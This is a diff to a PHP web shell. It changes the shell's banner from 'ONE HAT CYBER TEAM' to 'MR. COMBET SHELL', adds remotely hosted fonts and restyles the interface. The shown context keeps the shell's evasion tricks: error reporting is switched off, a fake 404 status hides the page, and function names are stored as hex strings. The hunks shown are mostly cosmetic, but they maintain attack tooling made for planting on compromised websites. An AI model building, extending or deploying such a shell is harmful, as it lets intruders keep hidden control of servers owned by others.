@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 http_response_code(404);
-define("Yp", "ONE HAT CYBER TEAM");
+define("Yp", "MR. COMBET SHELL");
 $G3 = "scandir";
 $c8 = [
     "7068705f756e616d65",
@@ -178,6 +178,20 @@ function tF($yf)
     <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js">
     </script>
     <style>
+@font-face {
+  font-family: 'SciFi';
+  src: url('https://dl.dropboxusercontent.com/s/amme5wvo77jghrk/SciFi.ttf');
+}
+@font-face {
+  font-family: "Sabon";
+  src: url('https://dl.dropboxusercontent.com/s/w6trj8t830zie1b/SabonItalic.eot') format("embedded-opentype"),
+    url('https://dl.dropboxusercontent.com/s/7fmrr74antez8qc/SabonItalic.woff2') format("woff2"),
+    url('https://dl.dropboxusercontent.com/s/7fmrr74antez8qc/SabonItalic.woff2') format("woff"),
+    url('https://dl.dropboxusercontent.com/s/ai3juz6r4kbfsmi/SabonItalic.svg') format("truetype"),
+    url('https://dl.dropboxusercontent.com/s/ai3juz6r4kbfsmi/SabonItalic.svg') format("svg");
+  font-weight: 400;
+  font-style: none;
+}
 a:hover {
 color: #00bfff;
 }
@@ -230,11 +244,10 @@ table.combetohct tfoot .links a{
     border: 1px solid #00bfff !important;
 }
 .d-flex {
-    display: -ms-flexbox !important;
     display: flex !important;
     align-content: center;
     align-items: center;
-    justify-content: space-evenly;
+    justify-content: space-between;
 }
 .b-flex {
     display: -ms-flexbox !important;
@@ -266,6 +279,9 @@ table.combetohct tfoot .links a{
 .text-light {
     color: white !important;
     font-size: 18px;
+}
+.combetohct {
+    font-size: 2em;
 }
 </style>
 <style>
@@ -354,8 +370,7 @@ padding-bottom: 0px;
 <body style="margin-left:auto;margin-right:auto;width: 99%;font-size: 18px;">
  <div class="bg-dark border table-responsive mt-2">
   <div class="maan-top-bar">
-   <div class="container">
-    <div class="date-time">
+   <div class="d-flex">
      <div class="maan-current-date" style="display:table-cell; float:none; text-align:left;">
        <span class="txt" id="hours"></span>
        <span id="point">:</span>
@@ -365,15 +380,14 @@ padding-bottom: 0px;
        <span class="txt" id="period"></span>
      </div>
      <div style="display:table-cell; float:none; text-align:center;">
-      <h1 class="mt-1">
-       <a href="?" style="font-size:35px;">
+      <h1 class="combetohct">
+       <a href="?" style="font-size:35px;font-family: 'SciFi';">
        <?= Yp ?>
        </a>
       </h1>
      </div>
-     <div id="Date" class="txt" style="display:table-cell; float:none; text-align:right;">
+     <div id="Date" class="txt" style="display:table-cell; float:none; text-align:center;margin-right: 20px;">
      </div>
-    </div>
    </div>
   </div>
  </div>
